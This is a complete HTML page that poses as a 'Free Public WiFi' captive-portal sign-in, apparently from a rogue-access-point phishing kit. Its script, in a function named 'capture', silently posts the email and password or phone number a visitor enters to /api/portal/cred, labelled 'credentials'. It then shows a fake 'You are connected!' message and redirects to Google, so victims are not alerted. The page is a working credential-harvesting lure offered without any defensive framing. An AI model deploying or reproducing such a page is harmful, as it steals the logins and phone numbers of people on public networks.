<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free WiFi — Sign In</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    color: #e0e0e0;
  }
  .card {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(12px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 16px;
    padding: 40px 36px;
    width: 380px;
    max-width: 95vw;
    box-shadow: 0 8px 40px rgba(0,0,0,0.4);
  }
  .wifi-icon {
    text-align: center; font-size: 48px; margin-bottom: 8px;
    filter: drop-shadow(0 0 12px rgba(100,200,255,0.5));
  }
  h1 { text-align: center; font-size: 22px; font-weight: 600; margin-bottom: 4px; color: #fff; }
  .sub { text-align: center; font-size: 13px; color: #8899aa; margin-bottom: 28px; }
  .field { margin-bottom: 16px; }
  label { display: block; font-size: 12px; color: #8899aa; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
  input[type=text], input[type=email], input[type=password], input[type=tel] {
    width: 100%; padding: 12px 14px;
    background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.12);
    border-radius: 8px; color: #fff; font-size: 14px; outline: none;
    transition: border 0.2s;
  }
  input:focus { border-color: rgba(100,200,255,0.5); background: rgba(255,255,255,0.1); }
  input::placeholder { color: #556677; }
  .btn-submit {
    width: 100%; padding: 13px;
    background: linear-gradient(90deg, #0066cc, #0099ff);
    border: none; border-radius: 8px; color: #fff; font-size: 15px;
    font-weight: 600; cursor: pointer; margin-top: 8px; transition: opacity 0.2s;
    letter-spacing: 0.3px;
  }
  .btn-submit:hover { opacity: 0.9; }
  .btn-submit:active { opacity: 0.8; }
  .terms { font-size: 11px; color: #556677; text-align: center; margin-top: 16px; line-height: 1.6; }
  .terms a { color: #4499cc; text-decoration: none; }
  .provider { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
  .provider-dot { width: 8px; height: 8px; border-radius: 50%; background: #00cc66; box-shadow: 0 0 8px #00cc66; flex-shrink: 0; }
  .provider span { font-size: 13px; color: #aabbcc; }
  .divider { display: flex; align-items: center; gap: 10px; margin: 20px 0; }
  .divider div { flex: 1; height: 1px; background: rgba(255,255,255,0.08); }
  .divider span { font-size: 11px; color: #445566; }
  .loading { display: none; text-align: center; padding: 20px; }
  .loader { display: inline-block; width: 24px; height: 24px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #0099ff; border-radius: 50%; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .success { display: none; text-align: center; padding: 20px; }
  .success .check { font-size: 40px; margin-bottom: 8px; }
  .success p { color: #8899aa; font-size: 13px; }
</style>
</head>
<body>
<div class="card">
  <div class="wifi-icon">&#8984;</div>
  <h1>Free Public WiFi</h1>
  <p class="sub">Sign in to get online</p>

  <div class="provider">
    <div class="provider-dot"></div>
    <span>Connected to <strong>FreeWiFi</strong></span>
  </div>

  <form id="portal-form" onsubmit="submitForm(event)">
    <div class="field">
      <label>Email address</label>
      <input type="email" id="f-email" name="email" placeholder="you@example.com" autocomplete="email">
    </div>
    <div class="field">
      <label>Password</label>
      <input type="password" id="f-password" name="password" placeholder="Password" autocomplete="current-password">
    </div>
    <button type="submit" class="btn-submit">Sign In &amp; Connect</button>
  </form>

  <div class="divider"><div></div><span>OR CONTINUE WITH</span><div></div></div>

  <form id="phone-form" onsubmit="submitPhone(event)">
    <div class="field">
      <label>Phone number</label>
      <input type="tel" id="f-phone" name="phone" placeholder="+1 (555) 000-0000">
    </div>
    <button type="submit" class="btn-submit" style="background: linear-gradient(90deg, #333, #555)">Send SMS Code</button>
  </form>

  <div class="loading" id="loading">
    <div class="loader"></div>
    <p style="font-size:12px;color:#556677;margin-top:8px">Connecting...</p>
  </div>
  <div class="success" id="success">
    <div class="check">&#10003;</div>
    <p>You are connected!<br>Redirecting...</p>
  </div>

  <p class="terms">
    By connecting you agree to our <a href="#">Terms of Service</a> and
    <a href="#">Privacy Policy</a>. This network is monitored for security purposes.
  </p>
</div>

<script>
async function submitForm(e) {
  e.preventDefault();
  const email = document.getElementById('f-email').value;
  const password = document.getElementById('f-password').value;
  await capture({type:'credentials', email, password});
}

async function submitPhone(e) {
  e.preventDefault();
  const phone = document.getElementById('f-phone').value;
  await capture({type:'phone', phone});
}

async function capture(data) {
  document.getElementById('portal-form').style.display = 'none';
  document.getElementById('phone-form').style.display = 'none';
  document.querySelector('.divider').style.display = 'none';
  document.getElementById('loading').style.display = 'block';

  try {
    await fetch('/api/portal/cred', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(data)
    });
  } catch(e) {}

  setTimeout(() => {
    document.getElementById('loading').style.display = 'none';
    document.getElementById('success').style.display = 'block';
    setTimeout(() => { window.location.href = 'http://www.google.com'; }, 2000);
  }, 1500);
}
</script>
</body>
</html>
